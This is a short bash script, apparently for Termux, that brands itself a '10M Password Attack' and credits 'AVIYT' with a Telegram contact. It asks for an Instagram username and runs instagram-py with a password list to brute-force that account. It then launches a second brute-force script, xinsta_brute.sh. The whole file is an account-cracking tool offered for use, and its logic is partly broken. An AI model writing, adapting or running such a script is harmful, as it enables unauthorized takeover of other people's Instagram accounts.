#10M passwors here
grn='\033[1;32m'
red='\033[1;31m'
rset='\033[0m'
ylo='\033[1;33m'
#!/bin/bash
clear
echo
echo '
   
  __       ____  ____  _  _  ____  ____ 
 / _\  ___(  _ \(  _ \/ )( \(_  _)(  __)
/    \(___)) _ ( )   /) \/ (  )(   ) _) 
\_/\_/    (____/(__\_)\____/ (__) (____)                       
               [#] 10M Password Attack [#]
' |lolcat
printf "\n"
printf "       \e[101m\e[1;77m  >>  Script By AVIYT  << \e[0m\n"
printf "\n"
printf "      \e[100m\e[1;77m >>  Telegram : \e[1;77m AVIYT \e[100m\e[1;77m << \e[0m\n"
printf "\n"
echo
read -p "[#] Enter Instagram ID/Username : " usrnm
echo
inspass=pass.txt
echo -e "\e[1;31m Loading 10M Passwords... \e[0m"
sleep 4
if [ $inspass = 0 ]                                             
then
echo -e  "$ylo >>> exiting........! Bye Bye :) <<<$rset"        
else

  instagram-py --username $usrnm --password-list $inspass

echo
sleep 30.0
cd /data/data/com.termux/files/home
fi
sleep 30.0
cd /data/data/com.termux/files/home/xinsta_brute
bash xinsta_brute.sh
